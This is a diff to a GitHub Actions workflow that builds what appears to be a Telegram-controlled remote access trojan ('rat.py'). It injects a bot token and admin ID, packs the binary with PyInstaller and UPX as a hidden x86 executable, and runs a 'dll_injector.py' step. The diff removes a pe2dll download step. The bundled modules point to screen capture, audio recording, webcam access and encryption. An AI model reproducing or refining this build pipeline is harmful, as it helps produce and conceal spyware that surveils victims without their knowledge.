@@ -36,13 +36,6 @@ jobs:
       - name: Install UPX
         run: choco install upx -y
       
-      - name: Install PE2DLL
-        run: |
-          # Скачиваем pe2dll
-          curl -L -o pe2dll.zip https://github.com/gentilkiwi/pe2dll/releases/latest/download/pe2dll.zip
-          unzip pe2dll.zip
-          echo "PE2DLL installed"
-      
       - name: Replace token and admin_id
         run: |
           python -c "
@@ -59,7 +52,7 @@ jobs:
         run: |
           pyinstaller --onefile --windowed --name "temp" --target-arch x86 --upx-dir="C:\ProgramData\chocolatey\lib\upx\tools" --hidden-import telegram --hidden-import telegram.ext --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import psutil --hidden-import requests --hidden-import sounddevice --hidden-import soundfile --hidden-import cryptography --hidden-import cryptography.fernet --hidden-import tkinter --hidden-import pycaw --hidden-import comtypes --hidden-import cv2 --hidden-import numpy --hidden-import GPUtil --hidden-import win10toast --collect-all telegram rat.py
       
-      - name: Build final (EXE to DLL)
+      - name: Build final
         run: |
           python dll_injector.py
       
